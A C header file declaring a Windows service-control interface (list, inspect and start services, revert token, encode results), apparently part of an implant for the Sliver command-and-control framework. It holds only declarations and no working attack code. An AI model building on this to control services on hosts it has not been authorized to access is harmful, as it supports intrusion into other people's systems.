/* sliver/services.h - Windows service control (SCM). */
#ifndef SLIVER_SERVICES_H
#define SLIVER_SERVICES_H

#include <stddef.h>
#include <stdint.h>
#include "sliver/proto.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
  char name[256];
  char display_name[256];
  char description[512];
  char bin_path[512];
  char account[256];
  uint32_t status;
  uint32_t startup_type;
} sliver_service_t;

int sliver_services_list(sliver_service_t *out, int max);
int sliver_service_detail(const char *name, sliver_service_t *out);
int sliver_service_start(const char *name);
int sliver_revert_to_self(void);

int sliver_service_name_decode(const void *data, size_t len, char *name, size_t cap);
int sliver_services_encode(sliver_buf_t *out, const sliver_service_t *svcs, int count,
                           const char *err);
int sliver_service_detail_encode(sliver_buf_t *out, const sliver_service_t *svc, const char *msg,
                                 const char *err);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_SERVICES_H */
